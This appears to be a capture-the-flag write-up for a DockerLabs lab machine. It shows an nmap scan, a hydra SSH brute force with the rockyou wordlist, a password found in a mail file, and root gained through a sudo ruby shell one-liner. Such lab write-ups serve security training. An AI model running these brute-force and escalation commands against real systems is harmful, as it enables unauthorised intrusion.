#Vacacciones DockerLabs - 14/05/2024

#web - https://dockerlabs.es/#/

We do a port scan with nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 22:08 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds

```
We access the website and see a blank web page:

![Captura de pantalla 2024-05-14 221852](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/3d24462b-04c5-47ac-a9dd-8fbb2ffad74a)

We look at the code and see two possible users ‘camilo’ and ‘juan’:

![Captura de pantalla 2024-05-14 221917](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/1c1ead82-09cc-430f-8a62-ea8e21e6c9c7)

We create a .txt file with these two users:
(Camilo is the user with which to do the brute force attack, put it first to make it faster).

```shell
└─$ nano users.txt
```

![Captura de pantalla 2024-05-14 224207](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/c6797580-33ad-49c4-998a-0ee01d6fea2f)

We proceed to the brute force attack with hydra:

```shell
└─$ hydra -L /home/kali/Desktop/Machines/users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-14 22:35:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-14 22:36:05
```

We access via ssh:

```shell
└─$ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
$ 
```

We tried sudo -l but it didn't work:

```shell
$ sudo -l
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on d3c3148a6872.
```

We tried looking for binaries with SUID permissions but there is nothing exploitable:

```shell
camilo@d3c3148a6872:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/bin/mount
/bin/umount
/bin/su

```

We travel between directories to see what we can find we go to ‘/home’ and if we do ls we see a directory called ‘var’ we enter and find another one called ‘mail’ inside there is another one called ‘camilo’ and inside we find a file ‘mail.txt’ we do a cat and this is what we see:

```shell
camilo@d3c3148a6872:/var/mail/camilo$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb

```

Now we access the machine with the user ‘root’ and the password ‘2k84dicb’:

```shell
└─$ ssh root@172.17.0.2
root@172.17.0.2's password: 
Permission denied, please try again.
```

We test it and we see that the user is not root, now we are going to test it with the user ‘juan’:

```shell
└─$ ssh juan@172.17.0.2
juan@172.17.0.2's password: 
$ 

```

This time it works.
We run a ‘sudo -l’ to see if we can escalate privileges from here:

```shell
$ sudo -l
Matching Defaults entries for juan on d3c3148a6872:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on d3c3148a6872:
    (ALL) NOPASSWD: /usr/bin/ruby

```

We see that we can run the binary ‘/usr/bin/ruby’ without a password:
We enter ‘https://gtfobins.github.io/gtfobins/ruby/’ and paste the code into the terminal:

```shell
$ sudo ruby -e 'exec "/bin/sh"'

```

```shell
# whoami
root
# 
